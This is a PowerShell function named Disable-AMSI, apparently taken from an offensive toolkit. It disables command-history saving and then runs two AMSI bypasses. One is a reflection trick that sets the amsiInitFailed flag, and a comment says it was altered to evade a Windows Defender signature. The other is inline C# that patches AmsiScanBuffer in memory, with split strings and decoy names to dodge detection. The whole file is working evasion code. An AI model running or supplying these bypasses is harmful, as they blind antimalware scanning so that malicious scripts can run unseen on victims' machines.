function Disable-AMSI
{
    Set-PSReadlineOption -HistorySaveStyle SaveNothing

$AMSIBypass2=@"
using System;
using System.Runtime.InteropServices;

namespace RandomNamespace
{
    public class RandomClass
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void RandomFunction()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
         
            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
            Byte[] one = { 0x31 };
            Byte[] two = { 0xff, 0x90 };
            int length = one.Length + two.Length;
            byte[] sum = new byte[length];
            one.CopyTo(sum,0);
            two.CopyTo(sum,one.Length);
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
             Marshal.Copy(sum, 0, unmanagedPointer, 3);
             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
        }
    }
}
"@

#AMSI Bypass 1, by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()

}